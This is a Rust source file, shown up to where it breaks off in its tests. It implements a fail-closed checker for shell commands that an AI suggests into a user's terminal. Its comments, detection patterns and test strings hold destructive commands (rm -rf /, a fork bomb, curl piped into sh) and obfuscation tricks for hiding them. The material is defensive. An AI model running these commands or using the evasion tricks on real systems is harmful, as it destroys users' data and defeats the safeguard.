//! Shell-line analysis for the one place a model-produced string reaches
//! a human's Enter key: `lisa suggest`, which types its answer straight
//! into the shell's edit buffer (ADR-0029 §4).
//!
//! This is not a shell. It is a *conservative reader* of one, and the
//! governing rule — learned the hard way in the first review round — is
//! **fail closed on anything it cannot model**. A reader that guesses is
//! worse than no reader: `rm${IFS}-rf${IFS}/` and `$'\x72\x6d' -rf /`
//! both used to come back `Allow`, and both were one Enter from running.
//!
//! So the pipeline is: normalize the expansions we understand, split on
//! every construct that starts a new command (including subshells, brace
//! groups, `eval` and process substitution), reduce each program to its
//! basename so `/bin/rm` is still `rm`, and refuse outright when the
//! program name is still computed at runtime.

use crate::Verdict;
use crate::rules;
use std::path::Path;

/// One program that a command line would actually execute, with the
/// wrappers (`sudo`, `env`, `xargs`, `FOO=bar`) already peeled off.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Invocation {
    /// Reached through `sudo`/`doas`/`pkexec`.
    pub escalated: bool,
    /// The program's **basename**. Every rule matches on this, so
    /// `/bin/rm`, `./rm` and `rm` are the same program — which they are.
    pub program: String,
    pub args: Vec<String>,
}

impl Invocation {
    /// Arguments that are not option flags — the targets a rule cares
    /// about, and for subcommand tools the verb (`git` → `reset`).
    pub fn operands(&self) -> impl Iterator<Item = &str> {
        self.args
            .iter()
            .map(String::as_str)
            .filter(|a| !a.starts_with('-'))
    }

    /// An exact long flag, with or without an `=value` tail.
    pub fn has_flag(&self, flag: &str) -> bool {
        self.args
            .iter()
            .any(|a| a == flag || a.split('=').next() == Some(flag))
    }

    /// Any of these letters bundled into a short flag group: `-rf`
    /// carries both `r` and `f`.
    pub fn has_any_short_flag(&self, letters: &[char]) -> bool {
        self.args.iter().any(|a| {
            a.starts_with('-')
                && !a.starts_with("--")
                && a.chars().skip(1).any(|c| letters.contains(&c))
        })
    }
}

/// Programs that are a shell by another name. Reaching one of these
/// through a pipe is how an allowlist becomes a suggestion.
const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh"];

/// Other languages that execute. They are a shell for the purpose of
/// "do not pipe into this", but their source is *not* shell syntax — so
/// it is never read as if it were. Reading Python as shell is what made
/// `python3 -c 'os.system("rm -rf /")'` parse to nothing (round 2, #71),
/// and doing it to awk denied `awk '{print $1}'` (round 3).
const INTERPRETERS: &[&str] = &[
    "python",
    "perl",
    "ruby",
    "node",
    "php",
    "awk",
    "gawk",
    "mawk",
    "nawk",
    "lua",
    "deno",
    "bun",
    "osascript",
    "tclsh",
    "expect",
];

/// Tools that stand in front of a real command. Round 3 (#81) found
/// `flock`, `script`, `taskset` and `unshare` walking past this list, and
/// the list will never be complete — so it is no longer the only defence:
/// a program this crate does not recognise at all gets its words judged
/// as candidate programs too. See [`Segment::invocations`].
const WRAPPERS: &[&str] = &[
    "env",
    "nohup",
    "command",
    "builtin",
    "exec",
    "nice",
    "ionice",
    "stdbuf",
    "time",
    "timeout",
    "xargs",
    "setsid",
    "chrt",
    "busybox",
    "toybox",
    "flock",
    "script",
    "taskset",
    "unshare",
    "nsenter",
    "systemd-run",
    "proot",
    "eatmydata",
];

/// Programs the rules know how to judge, plus everyday tools whose
/// arguments are data rather than another command to run.
///
/// Anything *outside* this list may be a wrapper nobody has heard of, so
/// its words are judged as candidate programs as well (round 3, #81).
/// The list is a false-positive suppressor, not a security boundary: an
/// unknown program is treated with more suspicion, never less.
const KNOWN_LEAF_PROGRAMS: &[&str] = &[
    // Everything a rule reasons about.
    "rm",
    "rmdir",
    "shred",
    "chmod",
    "chown",
    "chgrp",
    "dd",
    "mkfs",
    "wipefs",
    "blkdiscard",
    "sgdisk",
    "fdisk",
    "parted",
    "badblocks",
    "cfdisk",
    "tee",
    "cp",
    "mv",
    "install",
    "ln",
    "truncate",
    "sed",
    "find",
    "history",
    "journalctl",
    "reboot",
    "poweroff",
    "halt",
    "shutdown",
    "kexec",
    "systemctl",
    "pacman",
    "apt",
    "apt-get",
    "dnf",
    "yum",
    "zypper",
    "npm",
    "pnpm",
    "yarn",
    "pip",
    "pip3",
    "cargo",
    "curl",
    "wget",
    "nc",
    "ncat",
    "ssh",
    "scp",
    "rsync",
    "ftp",
    "git",
    "trap",
    "watch",
    "eval",
    // Everyday tools whose arguments are data.
    "echo",
    "printf",
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "sort",
    "uniq",
    "diff",
    "grep",
    "less",
    "more",
    "man",
    "which",
    "file",
    "stat",
    "du",
    "df",
    "ps",
    "kill",
    "pkill",
    "tar",
    "zip",
    "unzip",
    "gzip",
    "gunzip",
    "xz",
    "zstd",
    "date",
    "whoami",
    "id",
    "uname",
    "hostname",
    "mkdir",
    "touch",
    "pwd",
    "cd",
    "true",
    "false",
    "test",
    "sleep",
    "seq",
    "tr",
    "cut",
    "paste",
    "join",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "mktemp",
    "make",
    "just",
    "cmake",
    "ninja",
    "meson",
    "docker",
    "podman",
    "kubectl",
    "dart",
    "flutter",
    "rustc",
    "rustup",
    "go",
    "gcc",
    "clang",
    "ping",
    "dig",
    "host",
    "ip",
    "lsblk",
    "blkid",
    "mount",
    "umount",
    "systemd-analyze",
];

/// Programs whose first argument is code to run later (`trap 'rm -rf /'
/// EXIT`).
const DEFERRED_CODE: &[&str] = &["trap", "watch"];

/// Programs whose operands are the thing destroyed. If one of *these*
/// has a target computed at runtime, the guard cannot see what it hits
/// (round 2, #77) — a runtime program name was already refused, and a
/// runtime target is the same problem one argument along.
const TARGET_SENSITIVE: &[&str] = &[
    "rm",
    "rmdir",
    "shred",
    "chmod",
    "chown",
    "chgrp",
    "dd",
    "wipefs",
    "blkdiscard",
    "tee",
    "truncate",
    "mkfs",
];

/// Prefix words that stand in front of the real program. `busybox` is
/// here because `busybox rm -rf /` is `rm -rf /`.
const ESCALATORS: &[&str] = &["sudo", "doas", "pkexec", "su", "run0"];

/// Shell grammar words that stand where a program name would be. Without
/// these, `if true; then rm -rf /; fi` reads as a program called `then`
/// and every rule misses it.
const KEYWORDS: &[&str] = &[
    "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "for", "case", "esac",
    "select", "function", "in", "{", "}", "(", ")", "!", "coproc",
];

/// How deep nested substitution and `eval` may go before the reader gives
/// up and refuses. Real command lines never approach this.
const MAX_DEPTH: usize = 6;

/// Judge a free-form shell command line.
pub fn check_shell_line(line: &str) -> Verdict {
    check_shell_line_inner(line, 0)
}

fn check_shell_line_inner(raw: &str, depth: usize) -> Verdict {
    if depth > MAX_DEPTH {
        return Verdict::deny(
            "shell.unreadable",
            "nests deeper than this reader will follow — it cannot be judged safely",
        );
    }

    // A fork bomb survives no tokenizer worth writing, so match its shape
    // on the raw text before anything else touches it.
    if let Some(v) = fork_bomb(raw) {
        return v;
    }
    // …and again after expansion, since `$'\x3a'` spells `:` too.
    let (line, injected_syntax) = normalize_expansions(raw);
    if injected_syntax {
        // `echo $'\x27' ; rm -rf /` — the decoder emits a bare quote that
        // the tokenizer then honours, swallowing the rest of the line
        // (round 3, #78). Decoding is a convenience for reading a program
        // name, never a way to author syntax.
        return Verdict::deny(
            "shell.unreadable",
            "an escape sequence decodes into shell syntax, so the command cannot be read as written",
        );
    }
    if let Some(v) = fork_bomb(&line) {
        return v;
    }

    let mut verdict = Verdict::Allow;

    // Command substitution runs too. Judge what is inside on its own
    // terms — `$(…)`, backticks, and `<(…)`/`>(…)` process substitution.
    for inner in substitutions(&line) {
        verdict = verdict.worst(check_shell_line_inner(&inner, depth + 1));
        if verdict.is_denied() {
            return verdict;
        }
    }

    for segment in segments(&line) {
        // Redirects are judged whether or not the segment has a program:
        // `echo x &> /etc/passwd` leaves a word-less segment behind, and
        // skipping it skipped the redirect too (round 2, #68).
        for target in &segment.redirects {
            verdict = verdict.worst(redirect_verdict(target));
            if verdict.is_denied() {
                return verdict;
            }
        }

        for embedded in segment.embedded_command_lines() {
            verdict = verdict.worst(check_shell_line_inner(&embedded, depth + 1));
            if verdict.is_denied() {
                return verdict;
            }
        }

        for inv in segment.invocations() {
            verdict = verdict.worst(judge(&inv, &segment, depth));
            if verdict.is_denied() {
                return verdict;
            }
        }
    }
    verdict
}

/// Judge one resolved invocation.
fn judge(inv: &Invocation, segment: &Segment, depth: usize) -> Verdict {
    // The program name is still computed at runtime (`${CMD} -rf /`).
    // We cannot know what runs, so we do not pretend to.
    if is_unresolved(&inv.program) {
        return Verdict::deny(
            "shell.unreadable",
            "the program name is computed at runtime, so what would actually run cannot be determined",
        );
    }

    // …and neither can we when the *target* is computed (#77).
    if (TARGET_SENSITIVE.contains(&inv.program.as_str()) || inv.program.starts_with("mkfs."))
        && inv.args.iter().any(|a| is_unresolved(a))
    {
        return Verdict::deny(
            "shell.unreadable",
            format!(
                "`{}` acts on a target computed at runtime, so what it would destroy cannot be determined",
                inv.program
            ),
        );
    }

    let mut verdict = Verdict::Allow;

    // `eval "rm -rf /"` and `trap 'rm -rf /' EXIT` — judge the code.
    if inv.program == "eval" {
        return check_shell_line_inner(&inv.args.join(" "), depth + 1);
    }
    if DEFERRED_CODE.contains(&inv.program.as_str())
        && let Some(code) = inv.args.first()
    {
        verdict = verdict.worst(check_shell_line_inner(code, depth + 1));
    }

    if is_shell(&inv.program) {
        // Every argument of a shell is potential source, and enumerating
        // which flag introduces it is a losing game — `-c`, `-xc`, `-ec`,
        // `<<<` all do. Read them all, including ones that start with
        // `-`: `bash -c -- '-x; rm -rf /'` hid there (round 3, #79).
        //
        // This happens ONLY for shells, because only shell arguments are
        // shell syntax. Reading another language this way is the guessing
        // that produced #71 (python) and, when over-applied, denied
        // `awk '{print $1}'`.
        for arg in inv.args.iter() {
            verdict = verdict.worst(check_shell_line_inner(arg, depth + 1));
            if verdict.is_denied() {
                return verdict;
            }
        }
    }

    // awk takes its source as the first operand rather than behind a
    // flag, and `awk '{print $1}' f` is ordinary work — so awk's source
    // is checked for its own small external surface instead of being
    // refused wholesale (round 3, #80).
    if let Some(source) = awk_source(inv)
        && let Some(primitive) = AWK_EXEC_PRIMITIVES.iter().find(|p| source.contains(*p))
    {
        return Verdict::deny(
            "interpreter.inline_source",
            format!(
                "the `{}` program uses `{primitive}`, which runs external commands",
                inv.program
            ),
        );
    }

    // Inline source in a language this reader does not speak is refused
    // rather than approximated (round 2, #71).
    if inline_source_flag(&inv.program, &inv.args) {
        return Verdict::deny(
            "interpreter.inline_source",
            format!(
                "runs an inline `{}` program, which this guard cannot read — write it to a \
                 file you can review, or ask for the shell command you want",
                inv.program
            ),
        );
    }

    if segment.piped_into && executes_code(&inv.program) {
        return Verdict::deny(
            "pipe.to.shell",
            format!(
                "pipes output into `{}`, which executes whatever arrives",
                inv.program
            ),
        );
    }
    verdict.worst(rules::scan(inv))
}

/// Whether a word's value is unknown until the shell runs it — either an
/// expansion the reader could not resolve, or a glob rooted at an
/// absolute path, where `/e*` is `/etc` and `/{etc,usr}` is both
/// (round 3, #83). A *relative* glob (`*.tmp`, `build/*`) stays ordinary:
/// it can only match inside the working directory.
fn is_unresolved(word: &str) -> bool {
    if word.contains('$') || word.contains('`') {
        return true;
    }
    let bare = word.trim_matches(['"', '\'']);
    bare.starts_with('/') && bare.contains(['*', '?', '[', '{'])
}

/// Everything awk can use to reach outside itself. Unlike a general
/// language, awk's external surface really is this small, so reading the
/// source for these beats refusing every `awk '{print $1}'`.
const AWK_EXEC_PRIMITIVES: &[&str] = &["system(", "|", "getline", "close(", "ENVIRON"];

/// An awk-family program's source: the first operand, unless `-f` named
/// a script file instead.
fn awk_source(inv: &Invocation) -> Option<&String> {
    if !matches!(
        canonical_program(&inv.program),
        "awk" | "gawk" | "mawk" | "nawk"
    ) {
        return None;
    }
    if inv
        .args
        .iter()
        .any(|a| a == "-f" || a.starts_with("--file"))
    {
        return None;
    }
    inv.args.iter().find(|a| !a.starts_with('-'))
}

/// Whether these arguments hand the interpreter a program on the command
/// line. Deliberately narrow — `python3 -m http.server` is ordinary and
/// must keep working; only the flags that mean "here is source" count.
fn inline_source_flag(program: &str, args: &[String]) -> bool {
    // `python3.11 -c` is `python -c` (round 3, #80).
    let letters: &[char] = match canonical_program(program) {
        "python" => &['c'],
        "awk" | "gawk" | "mawk" | "nawk" => &['e'],
        "lua" => &['e'],
        "deno" | "bun" => &['e'],
        "osascript" => &['e'],
        "perl" => &['e', 'E'],
        "ruby" => &['e'],
        "node" => &['e', 'p'],
        "php" => &['r'],
        _ => return false,
    };
    args.iter().any(|a| {
        a == "--eval"
            || a == "--print"
            || (a.starts_with('-')
                && !a.starts_with("--")
                && a.chars().skip(1).any(|c| letters.contains(&c)))
    })
}

fn fork_bomb(line: &str) -> Option<Verdict> {
    let dense: String = line.chars().filter(|c| !c.is_whitespace()).collect();
    if dense.contains(":(){:|:&};:") || dense.contains(":(){:|:&};") {
        return Some(Verdict::deny(
            "fork.bomb",
            "a fork bomb — it takes the machine down",
        ));
    }
    None
}

/// Rewrite the expansions this reader understands into their plain form,
/// so word-splitting and encoding tricks cannot hide a program name.
///
/// `${IFS}`/`$IFS` become a space (their only purpose in an attack is to
/// separate words without typing one), and ANSI-C `$'…'` quoting is
/// decoded. Anything else containing `$` is left alone — and if it lands
/// in program position, the caller refuses rather than guesses.
/// Returns the normalized line, and whether decoding produced shell
/// syntax — which means the line cannot be trusted to read as written.
fn normalize_expansions(line: &str) -> (String, bool) {
    let spaced = line.replace("${IFS}", " ").replace("$IFS", " ");
    decode_ansi_c(&spaced)
}

/// Characters that steer the tokenizer. A decoded escape that produces
/// one of these is authoring syntax, not spelling a word.
const SYNTAX_CHARS: &[char] = &['\'', '"', '`', ';', '|', '&', '<', '>', '(', ')', '$', '#'];

/// Decode `$'…'` strings: `$'\x72\x6d'` is `rm`.
fn decode_ansi_c(line: &str) -> (String, bool) {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut injected = false;
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '$' && i + 1 < chars.len() && chars[i + 1] == '\'' {
            i += 2;
            while i < chars.len() && chars[i] != '\'' {
                if chars[i] == '\\' && i + 1 < chars.len() {
                    let (decoded, consumed) = decode_escape(&chars[i + 1..]);
                    if decoded.chars().any(|c| SYNTAX_CHARS.contains(&c)) {
                        injected = true;
                    }
                    out.push_str(&decoded);
                    i += 1 + consumed;
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            i += 1; // closing quote
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    (out, injected)
}

/// One backslash escape inside `$'…'`, and how many chars it consumed.
fn decode_escape(rest: &[char]) -> (String, usize) {
    let take_radix = |digits: &[char], radix: u32, max: usize| -> Option<(char, usize)> {
        let taken: String = digits
            .iter()
            .take(max)
            .take_while(|c| c.is_digit(radix))
            .collect();
        if taken.is_empty() {
            return None;
        }
        let value = u32::from_str_radix(&taken, radix).ok()?;
        Some((char::from_u32(value)?, taken.len()))
    };
    match rest.first() {
        Some('x') => match take_radix(&rest[1..], 16, 2) {
            Some((c, used)) => (c.to_string(), 1 + used),
            None => ("x".into(), 1),
        },
        Some('u') => match take_radix(&rest[1..], 16, 4) {
            Some((c, used)) => (c.to_string(), 1 + used),
            None => ("u".into(), 1),
        },
        Some(d) if d.is_digit(8) => match take_radix(rest, 8, 3) {
            Some((c, used)) => (c.to_string(), used),
            None => (d.to_string(), 1),
        },
        Some('n') => ("\n".into(), 1),
        Some('t') => ("\t".into(), 1),
        Some('r') => ("\r".into(), 1),
        Some('e') => ("\x1b".into(), 1),
        Some(other) => (other.to_string(), 1),
        None => (String::new(), 0),
    }
}

fn redirect_verdict(raw_target: &str) -> Verdict {
    // `> $CONF` and `> /et?/passwd` name a file the guard cannot see
    // (round 3, #83) — the same refusal `tee $CONF` already got.
    if is_unresolved(raw_target) {
        return Verdict::deny(
            "shell.unreadable",
            format!("redirects into `{raw_target}`, whose target cannot be determined here"),
        );
    }
    // Round 2 (#69): the normalizer built for `rm` targets was never
    // wired in here, so `> //etc/passwd` and `> /./etc/passwd` sailed
    // past a set of `starts_with` checks.
    let target = &rules::normalize_target(raw_target);
    if target.starts_with("/dev/sd")
        || target.starts_with("/dev/nvme")
        || target.starts_with("/dev/vd")
        || target.starts_with("/dev/hd")
        || target.starts_with("/dev/mmcblk")
    {
        return Verdict::deny(
            "disk.raw_write",
            format!("redirects output onto the block device `{target}`"),
        );
    }
    const IMAGE_ROOTS: &[&str] = &[
        "/etc/", "/usr/", "/boot/", "/efi/", "/bin/", "/sbin/", "/lib/",
    ];
    if IMAGE_ROOTS.iter().any(|r| target.starts_with(r)) || target == "/etc" {
        return Verdict::deny(
            "fs.system_write",
            format!("redirects output into `{target}`, which belongs to the OS image"),
        );
    }
    if target.ends_with("_history") || target.starts_with("/var/log/") {
        return Verdict::deny(
            "audit.erase",
            format!("truncates `{target}`, erasing the record of what ran"),
        );
    }
    Verdict::Allow
}

#[derive(Debug, Default)]
struct Segment {
    words: Vec<String>,
    piped_into: bool,
    redirects: Vec<String>,
}

impl Segment {
    /// Every program this segment could actually run.
    ///
    /// The first is the one wrapper-peeling resolved. When a wrapper or
    /// escalator stood in front of it, **every later word is offered as a
    /// candidate too** — because wrapper options that take a separate
    /// value (`env -u FOO rm -rf /`, `timeout -s KILL 5 rm …`,
    /// `xargs -I {} rm …`) leave the option's value looking like the
    /// program while the real one sits in argv (round 2, #67).
    ///
    /// Learning each wrapper's option grammar is the losing game this
    /// crate keeps having to stop playing. Judging every candidate is
    /// cheap, and errs toward seeing more commands rather than fewer.
    /// Whether this segment might be running a command it has not named
    /// in program position: a known wrapper or escalator is present, or
    /// the resolved program is one this crate has never heard of and so
    /// could be a wrapper nobody listed (`flock`, `script`, `unshare` —
    /// round 3, #81).
    fn is_opaque(&self) -> bool {
        let named_wrapper = self.words.iter().any(|w| {
            let name = basename(w);
            WRAPPERS.contains(&name.as_str()) || ESCALATORS.contains(&name.as_str())
        });
        named_wrapper
            || self.invocation().is_some_and(|inv| {
                !KNOWN_LEAF_PROGRAMS.contains(&inv.program.as_str()) && !executes_code(&inv.program)
            })
    }

    /// Words that look like a whole command line rather than one
    /// argument — `script -c 'rm -rf /etc'` hands its payload over as a
    /// single quoted word, so no candidate program ever spells `rm`.
    fn embedded_command_lines(&self) -> Vec<String> {
        if !self.is_opaque() {
            return Vec::new();
        }
        self.words
            .iter()
            .filter(|w| w.trim().contains(char::is_whitespace))
            .cloned()
            .collect()
    }

    fn invocations(&self) -> Vec<Invocation> {
        let Some(primary) = self.invocation() else {
            return Vec::new();
        };
        // A named wrapper, an escalator — or a program this crate simply
        // does not recognise, which is round 3's answer to `flock … rm
        // -rf /etc` (#81). Enumerating wrapper names was the same losing
        // game as enumerating their options; an unknown program is now
        // treated as possibly-a-wrapper rather than assumed to be a leaf.
        let mut out = vec![primary];
        if !self.is_opaque() {
            return out;
        }
        let escalated = self
            .words
            .iter()
            .any(|w| ESCALATORS.contains(&basename(w).as_str()));
        for (i, word) in self.words.iter().enumerate() {
            // A candidate is a guess, so it never earns a Deny for merely
            // being unreadable — that verdict belongs to the program the
            // segment actually named.
            if word.starts_with('-') || is_env_assignment(word) || is_unresolved(word) {
                continue;
            }
            let program = basename(word);
            if out.iter().any(|inv| inv.program == program) {
                continue;
            }
            out.push(Invocation {
                escalated,
                program,
                args: self.words[i + 1..].to_vec(),
            });
        }
        out
    }

    /// Peel wrappers and leading `VAR=value` assignments off the front to
    /// find the program that actually runs, then reduce it to a basename
    /// so `/bin/rm`, `./rm` and `rm` are one program.
    fn invocation(&self) -> Option<Invocation> {
        let mut escalated = false;
        let mut i = 0;
        while i < self.words.len() {
            let word = self.words[i].as_str();
            if ESCALATORS.contains(&basename(word).as_str()) {
                escalated = true;
                i += 1;
            } else if KEYWORDS.contains(&word) {
                i += 1;
            } else if WRAPPERS.contains(&basename(word).as_str()) {
                i += 1;
                // Skip the wrapper's own flags, and the bare number
                // `timeout 5 …`/`nice 10 …` take before the program.
                while i < self.words.len()
                    && (self.words[i].starts_with('-')
                        || self.words[i].chars().all(|c| c.is_ascii_digit()))
                {
                    i += 1;
                }
            } else if is_env_assignment(word) {
                i += 1;
            } else {
                break;
            }
        }
        let program = basename(self.words.get(i)?);
        Some(Invocation {
            escalated,
            program,
            args: self.words[i + 1..].to_vec(),
        })
    }
}

/// `python3.11` → `python`, `perl5.36` → `perl`. A version suffix does
/// not make it a different program (round 3, #80).
fn canonical_program(name: &str) -> &str {
    let trimmed = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if trimmed.is_empty() { name } else { trimmed }
}

/// A shell proper — the only thing whose arguments this reader will read
/// as shell syntax.
fn is_shell(program: &str) -> bool {
    SHELLS.contains(&program) || SHELLS.contains(&canonical_program(program))
}

/// Anything that executes: a shell, or another language's interpreter.
fn executes_code(program: &str) -> bool {
    is_shell(program)
        || INTERPRETERS.contains(&program)
        || INTERPRETERS.contains(&canonical_program(program))
}

/// `/usr/bin/rm` → `rm`. A program named by path is the same program.
fn basename(word: &str) -> String {
    if !word.contains('/') {
        return word.to_string();
    }
    Path::new(word)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| word.to_string())
}

/// `FOO=bar` in program position. Only checked *before* the program is
/// found, so `dd if=…` is never mistaken for one.
fn is_env_assignment(word: &str) -> bool {
    match word.split_once('=') {
        Some((key, _)) => {
            !key.is_empty()
                && !key.starts_with(|c: char| c.is_ascii_digit())
                && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

/// Split a line into the commands it would run, tracking which ones are
/// downstream of a pipe and where output is redirected.
///
/// Unescaped `(`/`)` (subshells, function bodies) and standalone `{`/`}`
/// (brace groups) start a new command just as `;` does — that is the
/// whole reason `( rm -rf / )` and `f(){ rm -rf /; }; f` used to read as
/// harmless.
fn segments(line: &str) -> Vec<Segment> {
    let mut out: Vec<Segment> = Vec::new();
    let mut cur = Segment::default();
    let mut piped_next = false;
    let mut word = String::new();
    let mut has_word = false;
    let mut redirect_pending = false;

    let push_word =
        |word: &mut String, has_word: &mut bool, cur: &mut Segment, redirect_pending: &mut bool| {
            if *has_word {
                if *redirect_pending {
                    cur.redirects.push(std::mem::take(word));
                    *redirect_pending = false;
                } else {
                    cur.words.push(std::mem::take(word));
                }
                word.clear();
                *has_word = false;
            }
        };

    let chars: Vec<char> = line.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match c {
            '\'' => {
                has_word = true;
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    word.push(chars[i]);
                    i += 1;
                }
                i += 1;
            }
            '"' => {
                has_word = true;
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    if chars[i] == '\\' && i + 1 < chars.len() {
                        i += 1;
                    }
                    word.push(chars[i]);
                    i += 1;
                }
                i += 1;
            }
            '\\' if i + 1 < chars.len() => {
                has_word = true;
                word.push(chars[i + 1]);
                i += 2;
            }
            c if c.is_whitespace() && c != '\n' => {
                push_word(&mut word, &mut has_word, &mut cur, &mut redirect_pending);
                i += 1;
            }
            // Subshell and function-body parentheses, and brace groups
            // written as standalone tokens, each begin a new command.
            '(' | ')' => {
                push_word(&mut word, &mut has_word, &mut cur, &mut redirect_pending);
                flush(&mut cur, &mut out, &mut piped_next, false);
                i += 1;
            }
            '{' | '}' if standalone_brace(&chars, i) => {
                push_word(&mut word, &mut has_word, &mut cur, &mut redirect_pending);
                flush(&mut cur, &mut out, &mut piped_next, false);
                i += 1;
            }
            // `&>` / `&>>` redirect both streams — a redirect, not a
            // separator, and missing that left the target unjudged (#68).
            '&' if i + 1 < chars.len() && chars[i + 1] == '>' => {
                push_word(&mut word, &mut has_word, &mut cur, &mut redirect_pending);
                redirect_pending = true;
                i += 1;
                while i < chars.len() && matches!(chars[i], '>' | '|') {
                    i += 1;
                }
            }
            '|' | '&' | ';' | '\n' => {
                push_word(&mut word, &mut has_word, &mut cur, &mut redirect_pending);
                let is_pipe = c == '|' && !(i + 1 < chars.len() && chars[i + 1] == '|');
                flush(&mut cur, &mut out, &mut piped_next, is_pipe);
                // Consume the second character of `&&`, `||` and `|&` —
                // without the last, `curl x |& sh` flushed a second time
                // and cleared the pipe flag (#68).
                if (c == '&' || c == '|')
                    && i + 1 < chars.len()
                    && (chars[i + 1] == c || (c == '|' && chars[i + 1] == '&'))
                {
                    i += 1;
                }
                i += 1;
            }
            '>' | '<' => {
                push_word(&mut word, &mut has_word, &mut cur, &mut redirect_pending);
                // `<>` opens the target for read AND write — it truncates
                // nothing but it does overwrite (round 3, #82).
                redirect_pending = c == '>' || (i + 1 < chars.len() && chars[i + 1] == '>');
                // `>|` forces the clobber; the `|` belongs to the operator.
                while i < chars.len() && matches!(chars[i], '>' | '<' | '|') {
                    i += 1;
                }
            }
            // A comment ends the line. Judging its text as a command was
            // an over-refusal (`ls # ; rm -rf /` → Deny, round 3, #87).
            '#' if !has_word => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
            }
            _ => {
                has_word = true;
                word.push(c);
                i += 1;
            }
        }
    }
    push_word(&mut word, &mut has_word, &mut cur, &mut redirect_pending);
    flush(&mut cur, &mut out, &mut piped_next, false);
    out
}

fn flush(cur: &mut Segment, out: &mut Vec<Segment>, piped_next: &mut bool, next_is_pipe: bool) {
    if !cur.words.is_empty() || !cur.redirects.is_empty() {
        cur.piped_into = *piped_next;
        out.push(std::mem::take(cur));
    }
    *piped_next = next_is_pipe;
}

/// Whether a `{`/`}` at `i` is a brace group rather than part of a word.
/// Bash requires `{` to be followed by whitespace and `}` to stand alone,
/// which is exactly what keeps `find … {} \;` from being split.
fn standalone_brace(chars: &[char], i: usize) -> bool {
    let before_ok = i == 0
        || chars[i - 1].is_whitespace()
        // `f(){ …` — a function body opens right after the parentheses.
        || matches!(chars[i - 1], ';' | '&' | '|' | '(' | ')');
    let after_ok = i + 1 >= chars.len() || chars[i + 1].is_whitespace();
    before_ok && after_ok
}

/// The contents of every `$(…)`, backtick, and `<(…)`/`>(…)` process
/// substitution in the line — each of which runs a command of its own.
fn substitutions(line: &str) -> Vec<String> {
    let mut found = Vec::new();
    let chars: Vec<char> = line.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let opens_paren = (chars[i] == '$' || chars[i] == '<' || chars[i] == '>')
            && i + 1 < chars.len()
            && chars[i + 1] == '(';
        if opens_paren {
            let mut depth = 1;
            let mut j = i + 2;
            let mut inner = String::new();
            while j < chars.len() && depth > 0 {
                match chars[j] {
                    '(' => depth += 1,
                    ')' => {
                        depth -= 1;
                        if depth == 0 {
                            break;
                        }
                    }
                    _ => {}
                }
                inner.push(chars[j]);
                j += 1;
            }
            found.push(inner);
            i = j + 1;
        } else if chars[i] == '`' {
            let mut j = i + 1;
            let mut inner = String::new();
            while j < chars.len() && chars[j] != '`' {
                inner.push(chars[j]);
                j += 1;
            }
            found.push(inner);
            i = j + 1;
        } else {
            i += 1;
        }
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_segment_of_a_chain_is_judged() {
        assert_eq!(
            check_shell_line("ls -la && rm -rf /").rule(),
            Some("rm.system_path")
        );
        assert!(check_shell_line("cd build; rm -rf /etc").is_denied());
        assert!(check_shell_line("echo hi | grep hi").is_allowed());
    }

    // Review round 1 (#59): every rule matched a bare basename, so naming
    // the program by path walked straight past all of them.
    #[test]
    fn a_program_named_by_path_is_the_same_program() {
        for line in [
            "/bin/rm -rf /",
            "./rm -rf /etc",
            "/usr/bin/sudo rm -rf /etc",
            "busybox rm -rf /",
            "/usr/bin/env sh -c 'rm -rf /'",
        ] {
            assert!(check_shell_line(line).is_denied(), "`{line}` was allowed");
        }
        assert_eq!(
            check_shell_line("curl https://x/y | /bin/sh").rule(),
            Some("pipe.to.shell")
        );
    }

    /// A shell is only dangerous for what it is handed, and that is now
    /// read rather than assumed — so a harmless inline script passes and
    /// one whose text we cannot resolve does not.
    #[test]
    fn inline_shell_scripts_are_read_not_waved_through() {
        assert!(check_shell_line("sh -c 'id'").is_allowed());
        assert!(check_shell_line("bash -lc 'cargo test'").is_allowed());
        assert!(check_shell_line("sh -c 'rm -rf /etc'").is_denied());
        assert_eq!(
            check_shell_line("sh -c \"$PAYLOAD\"").rule(),
            Some("shell.unreadable")
        );
    }

    // Review round 1 (#60): word-splitting and encoding hid the program.
    #[test]
    fn expansion_tricks_do_not_hide_the_program() {
        assert!(check_shell_line("rm${IFS}-rf${IFS}/").is_denied());
        assert!(check_shell_line("rm$IFS-rf$IFS/").is_denied());
        assert!(check_shell_line(r"$'\x72\x6d' -rf /").is_denied());
        assert!(check_shell_line(r"$'\162\155' -rf /").is_denied());
    }

    // Review round 1 (#60): what the reader cannot resolve, it refuses.
    #[test]
    fn a_runtime_program_name_is_refused_not_guessed() {
        for line in ["${CMD} -rf /", "$CMD -rf /", "`echo rm` -rf /x"] {
            let v = check_shell_line(line);
            assert!(v.is_denied(), "`{line}` returned {v}");
        }
        // A variable in an *argument* is ordinary and stays readable.
        assert!(check_shell_line("echo $HOME").is_allowed());
    }

    // Review round 1 (#61): compound commands were never read at all.
    #[test]
    fn compound_commands_are_read() {
        for line in [
            "{ rm -rf /; }",
            "( rm -rf / )",
            "eval \"rm -rf /\"",
            "eval 'rm -rf /etc'",
            "cat <(rm -rf /)",
            "tee >(rm -rf /)",
            "f(){ rm -rf /; }; f",
            "if true; then rm -rf /; fi",
        ] {
            assert!(check_shell_line(line).is_denied(), "`{line}` was allowed");
        }
    }

    /// Review round 2 (#67): wrapper options that take a separate value
    /// made the value look like the program and hid the real one in argv.
    #[test]
    fn wrapper_options_cannot_hide_the_program() {
        for line in [
            "env -u FOO rm -rf /",
